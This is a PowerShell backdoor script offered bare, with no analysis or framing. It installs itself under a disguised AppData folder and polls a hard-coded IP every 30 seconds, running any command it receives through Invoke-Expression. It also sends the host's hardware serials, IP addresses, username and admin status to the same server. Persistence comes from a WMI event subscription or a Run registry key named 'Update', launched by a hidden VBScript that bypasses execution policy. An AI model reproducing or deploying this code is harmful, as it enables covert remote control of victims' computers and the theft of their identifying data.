$verurl = 'http://31.5.63.215/script.txt'
$stop = 'destroy_shell_7$456&89'
$exec = 0

if(!(Test-Path -Path "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
$modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
		Write-Output "`$verurl` = 'http://31.5.63.215/script.txt'" > $modulename
		Write-Output "`$stop` = 'destroy_shell'" >> $modulename
		Write-Output "`$exec` = 0" >> $modulename
		Write-Output "while(`$true`) {" >> $modulename
		Write-Output "	start-sleep -seconds 30" >> $modulename
		Write-Output "	`$filecontent` =(New-Object Net.WebClient).DownloadString(`$verurl`)" >> $modulename
		Write-Output "	`$filecontent` = `$filecontent`.TrimEnd()" >> $modulename
		Write-Output "	if(`$filecontent` -ne 'standby') {" >> $modulename
		Write-Output "		if(`$filecontent` -eq `$stop`) {break}" >> $modulename
		Write-Output "		else {" >> $modulename
		Write-Output "			if(`$filecontent` -ne `$exec`) {" >> $modulename
		Write-Output "				Invoke-Expression `$filecontent` " >> $modulename
		Write-Output "				Write-Host 'Command Executed!' -ForegroundColor green" >> $modulename
		Write-Output "				`$exec` = `$filecontent` " >> $modulename
		Write-Output "			}" >> $modulename
		Write-Output "		}" >> $modulename
		Write-Output "	}" >> $modulename
		Write-Output "	`$a`=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; `$id_bios`=`$a`.split(' ')[2].Trim(); #bios id" >> $modulename
		Write-Output "	`$b`=wmic diskdrive get serialnumber; `$id_hdd`=`$b`.split('\n')[2].Trim(); #hdd id" >> $modulename
		Write-Output "	`$c`=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;`$id_uuid`=`$c`.split(' ')[64].Trim() #uuid" >> $modulename
		Write-Output "	`$ids`=`$ids`=`$id_bios`, `$id_hdd`, `$id_uuid`; `$ids`=[system.String]::Join(`"_`", `$ids`);" >> $modulename
		Write-Output "	`$time`=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');" >> $modulename
		Write-Output "	`$ip` = (Invoke-WebRequest ifconfig.me/ip).Content" >> $modulename
		Write-Output "	`$elevated` = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" >> $modulename
		Write-Output "	`$localip` = (Get-NetIPConfiguration | Where-Object {`$_`.IPv4DefaultGateway -ne `$null` -and `$_`.NetAdapter.Status -ne `"Disconnected`"}).IPv4Address.IPAddress" >> $modulename
		Write-Output "	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType `"application/json`" -Method POST -Body `"`$ids` `$ip` `$env:USERNAME` `$elevated` `$localip` `$time` `" | Out-Null " >> $modulename
		Write-Output "	if(`$exec` -eq `$filecontent`) {Start-Sleep -Seconds 10; Write-Output `"Command executed. Input another command or set script to standby.`"}" >> $modulename
		Write-Output "	else {Write-Output `"Standing by.`"}" >> $modulename
		Write-Output "}" >> $modulename

#persistance

		$VBFileName = "vbscript.vbs"
		$VBSFile = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\$VBFileName"
			Write-Verbose "Writing VBScript to $VBSFile"
			$VBSCode = "CreateObject(`"Wscript.Shell`").Run `"`"`"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`"`" -NoProfile -ExecutionPolicy Bypass -File `"`"$modulename`"`"`",0,True" #add from reddit
			Out-File -InputObject $VBSCode -Force $VBSFile
		
			$filterNS = "root\cimv2"
			$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
			if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
			{
					# Query taken from Matt's code in PowerSploit.
					Write-Verbose "Creating reboot persistence. The payload executes on every computer restart"
					$query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
				
					Write-Verbose "Creating a filter with name $filtername for executing $VBSFile."
					$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
					$consumerPath = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{name=$filterName; ScriptFileName=$VBSFile; ScriptingEngine="VBScript"}
					Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
			}
			else
			{        
				Write-Verbose "Not running with elevated privileges. Using RUn regsitry key"
				New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $VBSFile -force
			}

while($true) {
	start-sleep -seconds 30
	$filecontent =(New-Object Net.WebClient).DownloadString($verurl)
	$filecontent = $filecontent.TrimEnd()
	if($filecontent -ne 'standby') {
		if($filecontent -eq $stop) {break}
		else {
			if($filecontent -ne $exec) {
				Invoke-Expression $filecontent
				Write-Host 'Command Executed!' -ForegroundColor green
				$exec = $filecontent
			}
		}
	}
	$a=Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios=$a.split(' ')[2].Trim(); #bios id
	$b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
	$c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
	$ids=$ids=$id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
	$time=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');

	$ip = (Invoke-WebRequest ifconfig.me/ip).Content
	$elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
	$localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType "application/json" -Method POST -Body "$ids $ip $env:USERNAME $elevated $localip $time" | Out-Null

	if($exec -eq $filecontent) {Start-Sleep -Seconds 10; Write-Output "Command executed. Input another command or set script to standby."}
	else {Write-Output "Standing by."}
}
